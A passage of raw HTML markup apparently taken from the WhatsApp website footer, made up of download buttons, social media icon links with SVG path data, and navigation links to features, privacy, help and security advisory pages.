                        <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                    </svg></span></a></div>
                    </span>
                    <div class="_9tar _9ta3 _9ta5 _9ta7 _9tay _9tau _9uo9 _ae_t"><a aria-label="Twitter" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Twitter_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Youtube" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_YouTube_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Instagram_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Facebook" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Facebook_FinePrint_Link&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                            </svg></a></div>
                </div>
                <div class="_9t2j"><span class="_9uog"><a href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_WhatsApp_MobileLogo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_aeok" alt="WhatsApp Main Logo" src="https://static.whatsapp.net/rsrc.php/ya/r/GjxmhIpug9B.svg" /></span></a></span>
                    <div class="_9tar _9ta3 _9ta5 _9ta7 _9ta- _9taw _9t2l">
                        <div class="_9vd6 _9t33 _9bij _9biz _9bhb _9v12 _9taw _9tb0 _9u5z"><a href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_WhatsApp_MobileLogo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_aeok" alt="WhatsApp Main Logo" src="https://static.whatsapp.net/rsrc.php/yA/r/hbGnlm1gXME.svg" /></span></a><span class="_ae_s">
                                <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                            </svg></span></a></div>
                            </span></div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>What we do</h4>
                                </div>
                            </div><a href="https://www.whatsapp.com/stayconnected" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Features_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Features</span></span></a><a href="https://blog.whatsapp.com/" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Blog_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Blog</span></span></a><a href="https://www.whatsapp.com/security" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Security_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Security</span></span></a><a href="https://business.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_ForBusiness_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">For Business</span></span></a>
                        </div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>Who we are</h4>
                                </div>
                            </div><a href="https://www.whatsapp.com/about" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_AboutUs_WhoWeAre_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">About us</span></span></a><a href="https://www.whatsapp.com/join" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Careers_WhoWeAre_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Careers</span></span></a><a href="https://www.facebook.com/brand/resources/whatsapp/whatsapp-brand" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_BrandCenter_WhoWeAre_Link&quot;&#125;" target="_blank"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Brand Center</span></span></a><a href="https://www.whatsapp.com/privacy" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Privacy_WhoWeAre_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Privacy</span></span></a>
                        </div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>Use WhatsApp</h4>
                                </div>
                            </div><a href="https://www.whatsapp.com/android" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Android_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Android</span></span></a><a href="https://www.whatsapp.com/download" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Iphone_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">iPhone</span></span></a><a href="https://www.whatsapp.com/download" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_MacPc_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Mac/PC</span></span></a><a href="https://web.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_WhatsAppWeb_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">WhatsApp Web</span></span></a>
                        </div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>Need help?</h4>
                                </div>
                            </div><a id="contact_us_link_footer" href="https://www.whatsapp.com/contact" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_ContactUs_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Contact Us</span></span></a><a href="https://faq.whatsapp.com/" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_HelpCenter_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Help Center</span></span></a><a href="https://www.whatsapp.com/download" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Apps_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Apps</span></span></a><a href="https://www.whatsapp.com/security/advisories" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_SecurityAdvisories_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Security Advisories</span></span></a>
                        </div>
                    </div>
                </div>
                <div class="_9tar _9ta3 _9ta5 _9ta8 _9ta- _9tau _9uo7 _aeol"><span class="_ae_s">
                        <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                    </svg></span></a></div>
                    </span>
                    <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _9uo7 _ae_u"><a aria-label="Twitter" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Twitter_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Youtube" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_YouTube_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Instagram_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 